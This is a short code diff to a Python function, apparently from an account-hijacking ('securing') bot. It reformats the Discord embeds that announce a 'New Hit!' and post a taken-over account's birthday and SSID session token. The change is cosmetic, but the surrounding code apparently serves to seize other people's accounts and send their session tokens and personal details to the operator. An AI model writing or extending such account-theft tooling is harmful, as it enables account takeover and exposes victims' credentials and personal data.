@@ -45,7 +45,7 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
     infoEmbed.add_field(name="Birthday", value=f"```{account['birthday']}```", inline=False)
  
     hitEmbed = Embed(
-        title = f"New Hit! | {round(finalTime, 2)}s securing",
+        title = f"New Hit! | Secured in {round(finalTime, 2)}s",
         color = 0xE4D00A
     )
  
@@ -61,10 +61,11 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
         
         mcEmbed = Embed()
         
-        ssidEmbed = Embed()
-        ssidEmbed.add_field(name="**SSID**", value=f"```{account['SSID']}```", inline=False)
- 
-        ssidEmbed.color = 0x50C878
+        ssidEmbed = Embed(
+            title = "SSID",
+            description = f"```{account["SSID"]}```",
+            color = 0x50C878
+        )
  
  
     return [
